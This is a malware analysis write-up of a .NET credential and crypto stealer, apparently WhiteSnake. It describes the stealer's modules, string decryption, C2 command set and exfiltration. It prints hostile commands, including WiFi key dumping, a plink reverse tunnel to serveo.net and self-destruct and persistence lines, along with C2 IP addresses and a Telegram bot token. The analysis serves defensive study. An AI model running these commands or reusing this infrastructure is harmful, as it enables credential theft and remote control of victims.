.NET with obfuscated strings
a54Cm — Crypto + RC4 Class
Encrypted: 08 0D 0B 09 5C 11 01 14 10 07 0B
Decrypted: "tor" = 74 6F 72

XOR key = encrypted XOR decrypted:
08 ^ 74 = 7C
0D ^ 6F = 62
0B ^ 72 = 79

Packet Format:
┌────────────┬──────────────────┬─────────────────────┐
│ "WSR$"     │ RC4-encrypted    │ RSA-encrypted        │
│ (4 bytes)  │ XML data         │ RC4 key (32 bytes)   │
│            │ (system info)    │ (or raw if no RSA)   │
└────────────┴──────────────────┴─────────────────────┘

Encryption Layers

    XML Serialization — System info serialized to XML

    Deflate/GZip — hhZ::aTnghe() compresses the XML

    RC4 Encryption — a54Cm::tFeWc() with random 32-byte key

    RSA Encryption — The RC4 key is encrypted with RSA public key (stored in fz::neTc1)

    Packaging — "WSR$" header + RC4 data + encrypted key

The Algorithm
Component	Value
Key string	"bdf"
Key length	4 (3 from "bdf" + brute-force char)
Brute-force	Tries chars 32-126 (printable ASCII)
Validation	Decrypted string must start with "nooo:"
Prefix stripped	"nooo:" removed before returning


Complete System Information Fields
Encrypted	Decrypted	Purpose
serveo	serveo	Serveo.net tunneling service
Username	Username	Windows username
Compname	Compname	Computer name
Screen size	Screen size	Screen resolution
Manufacturer	Manufacturer	PC manufacturer
Beacon	Beacon	C2 beacon signal
Stub version	Stub version	Malware version
Execution location	Execution location	File path of running malware
Execution timestamp	Execution timestamp	When malware executed
Screenshot	Screenshot	Desktop screenshot
LoadedAssemblies	LoadedAssemblies	.NET assemblies loaded
RunningProcesses	RunningProcesses	Process list
InstalledApplications	InstalledApplications	Installed software
Grabber\Wallets	Grabber\Wallets	Crypto wallet grabber path!
Report	Report	Data report to C2


Configuration
Field	Decoded Value	Purpose
sjBM	Lebensborn2	Campaign/build tag
j3tt4D	m01g4892qu	C2 identifier/key
k4RA	1.6.3.4	Malware version
tDocF	helloworld.txt	Temp/debug file
xl1P	Starlabs	Browser profile directory name
r3bb	ucv4nuoh0h	Browser data directory name
Clipboard Hijacker (Clipper) — 15 Cryptocurrencies!

The malware replaces copied wallet addresses with the attacker's addresses:
Coin	Wallet Address
XMR (Monero)	[CLIPPER_XMR_WALLET]
BTC (Bitcoin)	[CLIPPER_BTC_WALLET]
BCH (Bitcoin Cash)	[CLIPPER_BCH_WALLET]
ZEC (Zcash)	[CLIPPER_ZEC_WALLET]
ETH (Ethereum)	[CLIPPER_ETH_WALLET]
DOGE (Dogecoin)	[CLIPPER_DOGE_WALLET]
LTC (Litecoin)	[CLIPPER_LTC_WALLET]
TRX (Tron)	[CLIPPER_TRX_WALLET]
XRP (Ripple)	[CLIPPER_XRP_WALLET]
DASH	[CLIPPER_DASH_WALLET]
NEO	[CLIPPER_NEO_WALLET]
XLM (Stellar)	[CLIPPER_XLM_WALLET]
BNB (Binance)	[CLIPPER_BNB_WALLET]
SOL (Solana)	[CLIPPER_SOL_WALLET]
ALG (Algorand)	[CLIPPER_ALG_WALLET]

// Telegram Bot API
string botToken = "7972507107:AAE0InlBzYqTeRUoXqUM9ewqhQJZRxDPcsE";
string chatId = "7259165684";

Summary
Method	Purpose
ikE	Count desktop monitors via WMI
gKZ	Capture screenshot — simulate Print Screen, read clipboard, save as PNG

brIk4 — WiFi Password Stealer + Saved Networks Grabber
Data	Format
WiFi Profile Name	Base64 encoded
WiFi Password	Base64 encoded
SSID	Base64 encoded
BSSID (MAC)	Base64 encoded, uppercase
Signal Strength	Integer (percentage)
Command	Purpose
netsh wlan show profiles	List all saved WiFi profiles
netsh wlan show profile "<name>" key=clear	Get password for specific profile
netsh wlan show networks mode=bssid	Scan nearby WiFi networks
Encrypted	Decoded
"\b\r\v\t\\\u0001\f\u0005\u0016BRSVRUF@DD\b\u0003\u0016\u0017\u000eF..."	"netsh wlan show profiles"
"\b\r\v\t\\\u0001\f\u0005\u0016BRSVRUF@B\n\u0003\u0012\u0011\fF..."	"netsh wlan show profile \"{0}\" key=clear"
"\b\r\v\t\\2\u0016\t\0\v\b\u0003"	"All User Profile"
"\b\r\v\t\\!\v\b\u0012\a\n\u0012"	"Key Content"
"\b\r\v\t\\1\r\u0001\b\u0003\b"	"Signal"
"\b\r\v\t\\\u0019T\u001bJ\u0019U\u001bJ\u0019V\u001bl"	"{0}:{1}:{2}\n" (format string)

d4w — Browser Extension/Plugin Stealer
Step	Action
1	Gets system root drive (C:\)
2	Enumerates all user directories (C:\Users\*\)
3	Builds path to AppData\Local for each user
4	Searches for directories matching *@* (browser profile pattern like Profile 1, Default)
5	Looks for specific target files inside each profile
6	Reads and exfiltrates the file contents
Encrypted	Decoded
"\b\r\v\t\\$\v\u001e\v\u0003\r\nL"	"*" (all users)
"\b\r\v\t\\>7\u0012\t\u0010\u0005\u0001\u0003"	"\\AppData\\Local"
"\b\r\v\t\\>%\u0005\u0005\r\u0011\b\u0012\u00118"	"\\" + targetFile

dt — Microphone Recorder
Command	Purpose
open new type waveaudio alias recorder	Open microphone for recording
set recorder bitspersample 16	Set 16-bit audio quality
save recorder <path>	Save recorded audio to file
close recorder	Close microphone
Encrypted	Decoded
"\b\r\v\t\\1!*#!0FLB\"4)/D1\u000f\fWT91\v\u0013\b\u0006 \u0003\u0010\v\a\u0003"	"SELECT * FROM Win32_SoundDevice"
"\b\r\v\t\\\u000f\r\u0005\u0014\r\u0014\u000e\t\f\u0001"	"microphone"
"\b\r\v\t\\\r\u0014\u0003\bB\n\u0003\u0011B0\u001f\u0016\aD..."	"open new type waveaudio alias recorder"
"\b\r\v\t\\\u0010\u0001\u0005\t\u0010\0F\u0014\a\a\u0015\t\u0017\n\u0002"	"set recorder bitspersample 16"
"\b\r\v\t\\\u0011\u0005\u0010\u0003B\u0016\u0003\u0005\u0011\v\u0013\b\u0006D"	"save recorder "
"\b\r\v\t\\\u0001\b\t\u0015\aD\u0014\u0003\u0001\u0017\t\u0013\f\0F"	"close recorder"

dvn — THE MAIN ENTRY POINT
Flag	Value	Meaning
fz::aUEtx	"0"	Don't show fake popup
fz::kKQpyF	"0"	Popup message
fz::nS8	"0"	Popup title
fz::nwBLVu	"0" or "1"	Beacon mode (persistent C2)
fz::pbg0	"0" or "1"	Self-destruct enabled
fz::xn9l1u	"1"	Tor proxy enabled
fz::p6lEW	"0"	Additional module 1 disabled
fz::nU6	"0"	Additional module 2 disabled
fz::eM71tY	""	C2 URL (empty = not configured)
Execution Modes
Mode	Config	Behavior
Single-run	nwBLVu=0	Steal data, send, self-destruct, exit
Beacon	nwBLVu=1	Steal data, stay running, wait for C2 commands
Beacon + Tor	nwBLVu=1, xn9l1u=1	Same but route through Tor
Encrypted	Decoded
"\b\r\v\t\\!\v\u0014\u0003B^\\F"	"Version: "
"\b\r\v\t\\7\u0014\n\t\u0003\0\u000f\b\u0005DHHL"	"Sending..."
"\b\r\v\t\\#))!77"	"Retry..."
"\b\r\v\t\\\u000f\u0005\u0002\u0003B\r\bF\n\u0001\a\u0010\a\n"	"Sent!"
"\b\r\v\t\\* 1'.(#2BIF'\f\u0010\u000fK..."	"Already connected..."
"\b\r\v\t\\* 1'.(#2BIF(\rD\u0005\u000e..."	"Cannot connect to server..."

e2IF2 — Payload Downloader + Executor
Encrypted	Decoded
"\b\r\v\t\\O\u0005FWPSHVLTHWX\u001fV\u001b"	"--port {0}"
"\b\r\v\t\\SVQHRJVHS"	"PortOpened"
"\b\r\v\t\\\u0012\u0016\t\u001e\u001bJ\u0003\u001e\a"	Something .exe (payload filename)
Long string in .cctor	Download URL for next stage!
e2IF2 — Complete Analysis
Field	Value
Download URL	https://github.com/wzshiming/socks5/releases/download/v0.4.2/socks5_windows_amd64.exe
Save Path	<browser_data_dir>\<something>.exe
Execution	socks5_windows_amd64.exe --port <random 6000-19000>
C2 Notification	Sends port number to C2 after execution
WhiteSnakeStealer downloads a LEGITIMATE SOCKS5 proxy server from GitHub!

The tool wzshiming/socks5 is an open-source SOCKS5 proxy server written in Go. The malware:

    Downloads it from GitHub releases

    Runs it on a random port (6000-19000)

    Notifies the C2 server: "PortOpened <port>"

    The C2 can then connect back through the SOCKS5 proxy to the victim's machine!


g_Nx — File Exfiltration via Multiple C2 Nodes
Encrypted	Decoded
"\b\r\v\t\\ \u0001\u0001\u000f\fD\u0012\u0014\u0003\n\u0015\0\a\u0016F"	"File size: "
"\b\r\v\t\\B\u0006\u001f\u0012\a\u0017FHLJ"	" bytes"
"\b\r\v\t\\\u000e\v\u0005\a\u000e\f\t\u0015\u0016"	"localhost"
"\b\r\v\t\\6\u0016\u001f\u000f\f\u0003F\b\r\0\u0003F"	"Node: "
"\b\r\v\t\\B\u0011\u0016\n\r\u0005\u0002F\a\u0016\u0014\t\u0010DHHL"	"Node X failed"
"\b\r\v\t\\B\r\u0015F\u0006\v\u0011\bND\u0012\u0014\u001b\r\b\u0001B\u0005\b\t\u0016\f\u0003\u0014B\u0017\u0003\u0014\u0014\u0001\u0014FLJH"	"Node X connection error"

31 C2 EXFILTRATION SERVERS!
C2 Infrastructure
#	URL	Port	SSL
0	206.166.251.4	8080	❌
1	167.99.138.249	8080	❌
2	46.4.73.118	9000	❌
3	206.189.109.146	80	❌
4	194.164.198.113	8080	❌
5	45.82.65.63	80	❌
6	5.196.181.135	443	✅
7	95.216.147.179	80	❌
8	185.217.98.121	8080	❌
9	116.202.101.219	8080	❌
10	185.217.98.121	80	❌
11	159.203.174.113	8090	❌
12	107.161.20.142	8080	❌
13	192.99.196.191	443	✅
14	44.228.161.50	443	✅
15	154.9.207.142	443	✅
16	66.42.56.128	80	❌
17	8.219.110.16	9999	❌
18	138.2.92.67	443	✅
19	8.134.71.132	8082	❌
20	41.87.207.180	9090	❌
21	18.228.80.130	80	❌
22	168.138.211.88	8099	❌
23	47.110.140.182	8080	❌
24	129.151.109.160	8080	❌
25	101.43.160.136	8080	❌
26	101.132.223.26	8080	❌
27	101.126.19.171	80	❌
28	38.60.191.38	80	❌
29	47.96.78.224	8080	❌
30	101.126.19.171	443	✅

Geographic Clusters (by IP ranges)
Range	Servers	Likely Provider
101.x.x.x	4 servers	Alibaba Cloud (China)
47.x.x.x	2 servers	Alibaba Cloud (China)
8.x.x.x	2 servers	Alibaba Cloud (China)
206.x.x.x	2 servers	DigitalOcean
185.217.x.x	1 server	VPS provider
167.99.x.x	1 server	DigitalOcean
159.203.x.x	1 server	DigitalOcean
107.161.x.x	1 server	RamNode
192.99.x.x	1 server	OVH
138.2.x.x	1 server	Oracle Cloud
18.228.x.x	1 server	AWS
38.60.x.x	1 server	Cogent


gT — NETWORK SCANNER + LAN SPREADER
This is a multi-threaded network scanner that discovers other machines on the local network and scans them for open ports!
The port list is in q9ykkm::w2 (initialized from static data). These likely include:

    21 (FTP), 22 (SSH), 23 (Telnet), 25 (SMTP)

    80 (HTTP), 443 (HTTPS), 445 (SMB)

    3389 (RDP), 5900 (VNC), 8080 (HTTP-alt)

    And many more common service ports
    Method	Purpose
    aaD	Get MAC address via ARP
    sqn	Increment IP address
    fLAz7v	Get local IPv4 addresses
    ot	Calculate all IPs in subnet range
    huf	Scan 70 ports on a host (parallel threads)
    fy	Full LAN scan — discover all devices + open ports

hhZ — Utility / Helper Class
Method	Purpose
cpiW	Error handler setup — logs unhandled exceptions to helloworld.txt
hGnSK	Set ServicePointManager.SecurityProtocol = 3072 (TLS 1.2)
mh2Zg	Fisher-Yates shuffle (randomize array)
tHBCHA	Generate random string of N characters
bh	Convert bytes to GB (divide by 1024², round to 2 decimals)
a25l	WMI query — get property from Win32_* class
ghDOd	URL-encode string (percent-encoding)
sXiqCp	Run command line (cmd /c <command>) and capture output
hg9GIh	Convert DateTime to Unix timestamp (seconds since 1970)
aTnghe	GZip compress byte array
tPT	Get process file path (via MainModule or WMI fallback)
kji7e7	Read file with lock bypass — copies to temp if locked, kills locking processes
op	Read all bytes from file
m3eK	Read file as UTF-8 string
d9Q1b	Read file as UTF-8 string (by path)

hkAR — System Information Gathering Class
Method	Purpose	Data Collected
yri	Username	Environment.UserName (spaces → _)
kwG	Computer Name	Environment.MachineName (spaces → _)
kGV	Public IP + Country	Downloads from API, splits response
b9i2	Screen Resolution	Width x Height from all screens
lNmoWR	CPU Name	WMI: Win32_Processor → Name
qDRTu	GPU Name	WMI: Win32_VideoController → Name
mTL	Total Disk Size	WMI: Win32_LogicalDisk → sum of Size in GB
gAlEby	RAM Size	WMI: Win32_ComputerSystem → TotalPhysicalMemory in GB
vDgtV	Manufacturer	WMI: Win32_ComputerSystem → Manufacturer
odOw	PC Model	WMI: Win32_ComputerSystem → Model
vDblL	Running Processes	Process.GetProcesses() → process names
q6R	Loaded DLLs	Current process modules (.dll files)
alcca	Active Window Title	GetForegroundWindow + GetWindowText
tTQ	Current Process Name	GetCurrentProcessId → MainModule.FileName
koBz	Installed AV/Security	Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall → DisplayName
pC3	Screenshot (all screens)	CopyFromScreen → JPEG bytes
jLcM5a	Total Screen Bounds	Union of all screen rectangles
v1gS8Y	Capture Screens	Copy from each screen
vu8	Bitmap to JPEG	Save bitmap as JPEG to memory
Encrypted	Decoded
"\b\r\v\t\\\n\u0010\u0012\u0016XKI\u000f\u0012I..."	"http://ip-api.com/line/?fields=query,country"
"\b\r\v\t\\7\n\r\b\r\u0013\b"	"Unknown"
"\b\r\v\t\\1!*#!0FLB\"4)/D1\u000f\fWT92..."	"SELECT * FROM Win32_Processor"
"\b\r\v\t\\1!*#!0FLB\"4)/D1\u000f\fWT94..."	"SELECT * FROM Win32_VideoController"
"\b\r\v\t\\1!*#!0FLB\"4)/D1\u000f\fWT9...."	"SELECT * FROM Win32_LogicalDisk WHERE DriveType=3"
"\b\r\v\t\\1!*#!0FLB\"4)/D1\u000f\fWT9!..."	"SELECT * FROM Win32_ComputerSystem"
"\b\r\v\t\\1+ 25%4#>)..."	"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
"\b\r\v\t\\&\r\u0015\u0016\u000e\u0005\u001f..."	"DisplayName"

hm6 — Dynamic DLL Loader / P/Invoke Helper
Encrypted	Decoded
"\b\r\v\t\\/\u0001\u0012\u000e\r\0F"	"Failed to get: "
"\b\r\v\t\\B\b\t\a\u0006D\0\a\v\b\u0003\u0002"	" from library"
"\b\r\v\t\\.\r\u0004\u0014\u0003\u0016\u001fF\u000e\v\a\u0002B\u0002\a\u000f\u000e\u0001\u0002"	"Library not loaded"
Feature	Detail
DLL Cache	sV — stores loaded DLL handles
Function Cache	dDsk — stores resolved function pointers
Typed Delegates	sg() — creates typed C# delegates from function pointers
Auto-Cleanup	Dispose() — calls FreeLibrary

hmi — The Data Report Structure
Struct	Purpose	Contains
qm	Stolen files/data	name (path), data (file bytes)
zB3	System information entries	key (field name), value (field data)
Summary
Component	Purpose
hmi	Top-level report container
qm[]	Stolen files (name + data)
zB3[]	System information (key + value pairs)
XML root	"report"
XML arrays	"files" and "information"

hy — The String Decryptor Class
Decryption Algorithm
text

For each character i in encrypted string:
    if i % 4 == 0:  key_byte = brute_force_char (tried 32-126)
    if i % 4 == 1:  key_byte = 'b' (Magic[0])
    if i % 4 == 2:  key_byte = 'd' (Magic[1])
    if i % 4 == 3:  key_byte = 'f' (Magic[2])

    decrypted[i] = encrypted[i] ^ key_byte

Valid key found when decrypted starts with "nooo:"
Return string after "nooo:" prefix
Field	Value	Purpose
Magic	"bdf"	Key base (3 characters)
KeySalt	"nooo:"	Validation prefix (5 characters)

i4uV — KEYLOGGER MODULE
This is the full keylogger implementation using a low-level keyboard hook (SetWindowsHookEx with WH_KEYBOARD_LL = 13).
Method	Purpose
vR8	Start keylogger — set hook, start message pump, start flush timer
x8d	Set WH_KEYBOARD_LL hook via SetWindowsHookEx
uBEaK3	Hook callback — capture every keystroke, store per-process
hDn4b	Convert virtual key code to string via ToUnicodeEx
nxLDM	Flush — write keystrokes to %TEMP%\KeyLogs\<date>\<process>.txt every 20s
qI5	Stop keylogger — unhook, clear buffers, stop timer

iAZ5a — Beacon/Command Type Enum
This enum defines 8 command types (0-7) for the beacon/C2 communication. These likely map to:
Value	Likely Command
0	System information report
1	File steal/exfiltration
2	Screenshot capture
3	Keylogger data
4	WiFi passwords
5	Network scan results
6	Microphone recording
7	Clipboard data
Summary

This enum serializes as XML values "0" through "7" and represents the type field in the report/beacon data structure.

iR — Windows Restart Manager — File Unlocker
This uses the Windows Restart Manager API (rstrtmgr.dll) to find which processes are locking a file, then returns those processes so the malware can kill them to unlock the file
Method	Purpose
jr2Fq	Find all processes locking a file using Restart Manager API
RmStartSession	Begin RM session
RmRegisterResources	Register the locked file
RmGetList	Get list of locking processes
RmEndSession	End RM session

j84d3 — C2 COMMAND SERVER (HTTP Listener + Command Dispatcher)
This class implements an HTTP server that listens for C2 commands and dispatches them to all the malware modules.
C2 Command Summary
Command	Function
PING	Return status, active window, keylogger processes
UNINSTALL	Full uninstall + self-destruct
INFORMATION	Collect and return full system report
SCREENSHOT	Take screenshot (all screens)
NETSCAN	Scan local network
DPAPI	Encrypt data with Windows DPAPI
PRINT	Screenshot via Print Screen
MICROPHONE	Record audio
ZIP_FILE	Compress file to ZIP
DOWNLOAD_EXTRACT	Download and extract archive
DOWNLOAD_FILE	Download file from C2
FETCH_FILE	Upload file to C2
DELETE_FILE	Delete file
DIRECTORY_LIST	List directory contents
PROCESS_LIST	List running processes
OPEN_PORT	Create tunnel to port
SOCKS5	Start SOCKS5 proxy
KEYLOGGER START/STOP/VIEW/JOURNALS/DUMP	Full keylogger control
SELFDESTRUCT	Delete malware traces
cd <path>	Change working directory
<anything else>	Execute as shell command!
HTTP Server Details
Setting	Value
Prefix	http://+:{port}/
Method	POST
Command separator	; (semicolon)
Response	Plain text UTF-8
j84d3 is the C2 command server — it:

    Starts an HTTP listener on a random port (2000-9000)

    Exposes itself via Tor hidden service or Serveo tunnel

    Accepts POST requests with semicolon-separated commands

    Dispatches to ALL malware modules (screenshot, keylogger, microphone, file ops, etc.)

    Any unrecognized command is executed as a shell command!

jg — THE BROWSER/WALLET STEALER ENGINE
Summary
Method	Purpose
d_5	Parse steal config from XML/URL/file
aL	Launch all steal commands in parallel threads
xEQC	Dispatch single command by type (0-7)
nX	Recursive file search + steal (files, wallets, passwords)
ta	Extract DPAPI-encrypted browser master key
zKdO	Recursive browser profile + wallet search
gKF4j6	Target browser files (Login Data, Cookies, etc.)
mLU2r	Browser profile directory patterns

k8OCdS — NGROK TUNNEL MANAGER
Summary
Method	Purpose
fGBU_v	Check if ngrok is installed and running
ctGle	Check if ngrok.exe process exists
vZ	Poll http://127.0.0.1:4040/api/tunnels for tunnel info
nSEQUd	Wait loop — poll every 4s until ngrok tunnel is ready
vc	Kill ngrok process

k9 — CLIPBOARD HELPER (STA Thread Wrapper)
What It Does

This is a thread-safe clipboard accessor — since Windows clipboard requires STA (Single Thread Apartment) threads, it spawns STA threads to access the clipboard.
Methods
Method	Purpose
r4poWn	Check if clipboard contains text
nc	Get text from clipboard
cS	Set text to clipboard (with retry loop!)
Why STA Threads?

Windows clipboard APIs require the calling thread to be STA (Single Thread Apartment). The malware's main threads may be MTA, so it spawns temporary STA threads for each clipboard operation.

kAXa7 — Command Structure
Command Type (iAZ5a)
Value	Purpose
0	File search by path/pattern
1	Browser profile data
2	Browser Local State / Login Data
3	Browser extensions (cached separately)
4	Registry key enumeration
5	Process file paths
6	WiFi + System info
7	Process memory regex matching
Fields
Property	XML	Purpose
_5G9CQMlbGi0MV	name	Command type (0-7 from iAZ5a enum)
_9ecly1dif2BW0	args	Array of arguments (paths, patterns, keys)
Summary

kAXa7 is the core steal command structure — it defines:

    What type of data to steal (file, browser, registry, process, etc.)

    Where to look (paths, patterns, registry keys)

ll3n — Self-Awareness / Executable Identity
Fields
Field	Value	Purpose
byXeX6	Full path	C:\...\malware.exe
nGHs	Filename	malware.exe
Where It's Used

These fields are referenced by other classes to:

    Know the malware's own filename for self-destruct

    Check if running from a specific location

    Pass the executable path to the C2 server

lN — Tor Expert Bundle Manager
This manages the Tor Expert Bundle (tor.exe) — similar to how k8OCdS manages ngrok.
Summary
Method	Purpose
phb6HA	Check if Tor Browser is installed
uK	WMI query: Is tor service running?
nyTj4X	Kill tor.exe process
pa	Wait loop — poll every 4s until Tor is running
The Three Tunnel Methods
Class	Tunnel Type	Check	Wait
lN	Tor Expert Bundle	phb6HA()	pa()
k8OCdS	ngrok	fGBU_v()	nSEQUd()
nBmmX8	Serveo.net	Via SSH	—
viT	Tor Hidden Service	Via Tor	—

ltNfD — Native API Resolver (P/Invoke Delegate Factory)
What It Is

This is the dynamic native API binding class — it uses hm6 (the DLL loader) to resolve Win32 API functions at runtime and create typed C# delegates for them.
Complete API Mapping
Delegate Type	DLL	Function	Purpose
__Kernel32_GetModuleHandle__	kernel32.dll	GetModuleHandleA	Get module handle
_BL2lpubeRjofO	user32.dll	GetForegroundWindow	Active window
_CgSemBagyQPrI	user32.dll	GetWindowTextLengthA	Window title length
_YRTQxzWea605T	user32.dll	GetWindowTextA	Window title text
_LJQQyPWL3SLZV	user32.dll	GetWindowThreadProcessId	Window → PID
_F5vFEwWPINREf	user32.dll	SetWindowsHookExA	Set keyboard hook
_BMNS98VppPsf2	user32.dll	UnhookWindowsHookEx	Remove hook
_TgkUkXPo77sCN	user32.dll	CallNextHookEx	Next hook in chain
_22dpwxSVsvFlf	user32.dll	GetAsyncKeyState	Key state check
_qnfVIjvAOHGFE	user32.dll	GetKeyboardState	All keys state
_DRHmFFqLgGDDT	user32.dll	GetWindowThreadProcessId	Window → thread
_hTkY0AjMu3Kxb	user32.dll	ToUnicodeEx	VK → Unicode char
_K7hTk4qCJwisV	user32.dll	MapVirtualKeyA	Scan code → VK
__User32_SendMessage__	user32.dll	SendMessageA	Send window message
_8R4PAjFs7mSI2	user32.dll	FindWindowExA	Find window
_P5mhNlmTDjXGG	crypt32.dll	CryptUnprotectData	DPAPI decrypt
_gMRMcDSYsyTp2	iphlpapi.dll	SendARP	Get MAC address
DLLs Loaded
DLL	hm6 Instance	Purpose
kernel32.dll	m3d	GetModuleHandleA
user32.dll	eld	12 functions (window, keyboard, hook)
crypt32.dll	fx	CryptUnprotectData (DPAPI)
iphlpapi.dll	ttq	SendARP (MAC address)
user32.dll	tbqc8V	SendMessageA, FindWindowExA
Methods
Method	Purpose
rzd	Initialize kernel32, user32, crypt32, iphlpapi delegates
cuK	Initialize hook-related delegates (SetWindowsHookEx, CallNextHookEx, GetAsyncKeyState, etc.)
qpC5kn	Initialize SendMessage + FindWindowEx (for screenshot)
ltNfD is the native API binding layer — it dynamically resolves 17 Windows API functions across 4 DLLs and wraps them in typed C# delegates. This enables:

    Keylogger (SetWindowsHookEx, CallNextHookEx, GetAsyncKeyState, ToUnicodeEx, MapVirtualKeyA)

    Window spying (GetForegroundWindow, GetWindowText, GetWindowThreadProcessId)

    Screenshot (FindWindowEx, SendMessage)

    DPAPI decryption (CryptUnprotectData — for browser passwords)

    Network scanning (SendARP — MAC address discovery)


mud — DATA EXFILTRATION ENGINE (Telegram + Custom C2)
Exfiltration Methods
Method	Function	Channel
1	e1RcR6	Custom HTTP C2 (POST with JSON metadata)
2	xkDPZU	Telegram Bot — send message with download URL
3	k6W	Telegram Bot — send as multipart document
4	cn50DQ	Telegram Bot — fallback (text mode)
Method	Purpose
st	Build complete report — XML serialize → GZip → RC4 encrypt → RSA wrap key → return packet
oM9oG	Send to C2 with 4 fallback methods
e1RcR6	Send via custom HTTP C2 (POST JSON)
xkDPZU	Send via Telegram message with download URL
k6W	Send via Telegram document upload
cn50DQ	Fallback — message mode
umRf	Fallback — text notification
cbaUZB	Fallback — report notification
pp	Write "1" to Report.txt to mark as done
mud is the final exfiltration engine — it collects everything, encrypts it, and sends it to Telegram + HTTP C2 with multiple fallback paths

nBmmX8 — Serveo.net Tunnel Manager
How Serveo Works
text
1. Download plink.exe (PuTTY SSH client)
2. Run: plink.exe -ssh -R 80:127.0.0.1:54321 serveo.net
3. Serveo gives public URL: https://abc123.serveo.net
4. Anyone accessing https://abc123.serveo.net → forwarded to victim's localhost:54321
5. Victim's HTTP C2 server is now publicly accessible!
Method	Purpose
jk8	Download and install plink.exe from official PuTTY site
kcH	Check registry for installed PuTTY/plink
rT	Run plink SSH to create Serveo tunnel
kA8tu	Create tunnel + notify C2 via Telegram
Class	Tunnel	Download	Binary
nBmmX8	Serveo.net	plink.exe from the.earth.li	SSH reverse tunnel
viT	Tor Hidden Service	Built-in or system Tor	Onion URL
k8OCdS	ngrok	ngrok from CDN	HTTP tunnel
lN	Tor Expert Bundle	System-installed Tor	SOCKS5 proxy

oqjg — CRYPTO CLIPPER (Address Swapper)
How It Works
text
1. Victim copies their crypto wallet address
   e.g., "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" (BTC)
   
2. Clipper detects it's a BTC address (via zR::hC)
   
3. Clipper checks fz::urpII["btc"] for attacker's BTC address
   e.g., "1AttackerBTCAddressHere..."
   
4. Clipper REPLACES clipboard silently!
   Victim pastes → sends money to ATTACKER instead!
   
5. Attacker gets Telegram notification:
   "Original: 1A1z... → Replaced: 1Att... (BTC)"
zR::hC(string text) detects which cryptocurrency an address belongs to by checking:

    BTC: Starts with 1, 3, or bc1, 26-35 chars

    ETH: Starts with 0x, 42 chars

    XMR: Starts with 4 or 8, 95 or 106 chars

    etc.

pl — SELF-DESTRUCT + PERSISTENCE + VM DETECTION
Summary
Method	Purpose
gL8	Get current executable path
pOD	Single instance mutex (m01g4892qu)
c9qNe	Register self-destruct on exit
f7	Execute self-destruct (cmd /c ping -n 3 & del)
gLjZ	Install persistence via schtasks scheduled task
rF	VM/Sandbox detection (12 indicators: VirtualBox, VMware, QEMU, KVM, Sandbox)
VM Detection Indicators
Indicator	Target
VirtualBox, vbox, vmbox	VirtualBox
VMware, VMXh	VMware
qemu, QEMU, kvm	QEMU/KVM
Virtual Machine, VirtualEnvironment	Generic VM
Sandbox	Sandboxie/Windows Sandbox
VirtualPC	Microsoft Virtual PC

pW — PAYLOAD DOWNLOADER + EXECUTOR (UPDATER)
Summary
Method	Purpose
cD	Download + execute payloads (comma-separated URL list)
pr	Download single file → save to %APPDATA% → optionally execute
f38ZHU	Download file via WebClient.DownloadData
jRtnq	Execute file via Process.Start
This Is the Updater/Loader Module

The C2 can push new payloads to the victim by:

    Setting fz::ybbKm4 to a URL (comma-separated for multiple)

    The malware downloads them to %APPDATA%

    Executes them immediately

This enables the attacker to deploy ANY additional malware to the compromised system

py9z — CUSTOM C2 REVERSE SHELL CLIENT
The Complete Custom C2 Flow
text

1. Malware drops windll.exe to Startup folder
2. windll.exe is a custom C2 client (downloaded separately)
3. Malware launches: windll.exe <C2_URL>/f/<target>?<encoded_info>
4. C2 server responds "1" when ready
5. windll.exe provides reverse shell / remote access
6. When C2 says "1", the calling process gets killed
Summary
Method	Purpose
h2Qa	Poll C2 server — check if it responds "1"
eQZFfE	Check if windll.exe exists
rja	Kill process after C2 confirms ready
mcl	Launch custom C2 client (windll.exe) with encoded parameters

q9ykkm — EMBEDDED DATA / STATIC ARRAYS
This class contains compile-time initialized static data — not code, but raw data used by the malware
Fields
Field	Size	Content	Purpose
hq	8 bytes	50 4B 01 02 17 0B 14 00	ZIP central directory magic
jRCRE	12 bytes	FF FF FF FF FF FF FF FF FF FF FF FF	Sentinel/placeholder
w2	280 bytes	Array of 70 integers	Port list for network scanner!
bK1	4 bytes	50 4B 06 06	ZIP EOCD magic
okr	6 bytes	50 4B 03 04 14 00	ZIP local file header magic
dNO	8 bytes	50 4B 05 06 00 00 00 00	ZIP EOCD magic
x_6VGj	4 bytes	50 4B 06 07	ZIP multi-disk magic
The Port List (w2) — 70 Ports!

Decoded integer values:
Port	Service
20	FTP-Data
21	FTP
22	SSH
23	Telnet
25	SMTP
53	DNS
80	HTTP
110	POP3
119	NNTP
123	NTP
135	RPC
137	NetBIOS
138	NetBIOS
139	NetBIOS
143	IMAP
161	SNMP
162	SNMP-trap
389	LDAP
443	HTTPS
445	SMB
465	SMTPS
500	IKE
514	Shell
515	Printer
543	KLogin
544	KShell
636	LDAPS
873	Rsync
989	FTPS-Data
990	FTPS
992	TelnetS
993	IMAPS
995	POP3S
1025	NFS/RPC
1080	SOCKS
1433	MSSQL
1521	Oracle
2049	NFS
3128	Squid
3306	MySQL
3389	RDP
5432	PostgreSQL
5900	VNC
6379	Redis
7001	WebLogic
8000	HTTP-Alt
8080	HTTP-Alt
8443	HTTPS-Alt
8888	HTTP-Alt
9000	Dev server
9090	WebSphere
9200	Elasticsearch
9300	Elasticsearch
11211	Memcached
15672	RabbitMQ
27017	MongoDB
27018	MongoDB
27019	MongoDB
28017	MongoDB Web
37777	Dahua DVR
44818	EtherNet/IP
47808	BACnet
49152	Windows RPC
50000	DB2
50030	Hadoop
50070	Hadoop
61616	ActiveMQ
ZIP Magic Bytes

The ZIP-related fields (hq, bK1, okr, dNO, x_6VGj) are ZIP file format signatures used by the ZIP extraction module to process downloaded archives:
Field	Bytes	ZIP Structure
okr	50 4B 03 04 14 00	Local File Header
hq	50 4B 01 02 17 0B 14 00	Central Directory Entry
dNO	50 4B 05 06 00 00 00 00	End of Central Directory
x_6VGj	50 4B 06 07	ZIP64 EOCD Locator
bK1	50 4B 06 06	ZIP64 EOCD

qm — Stolen File Entry Structure
Properties
Property	XML Attr	Type	Purpose
_pudfaHoFci3Au	fn	string	File path/name
_zI3KXNNS4bT7o	fd	byte[]	File data (Base64 in XML)
_TWwiKiIvuFtwF	fs	long	File size (bytes)
_hOeQJ9R5Km89V	cd	long	Creation time (Unix timestamp)
_SxcACbQSx3Rps	md	long	Modification time (Unix timestamp)
Summary

qm is the stolen file container — it holds:

    The file's original path

    The file's binary contents

    Size + timestamps for forensic info

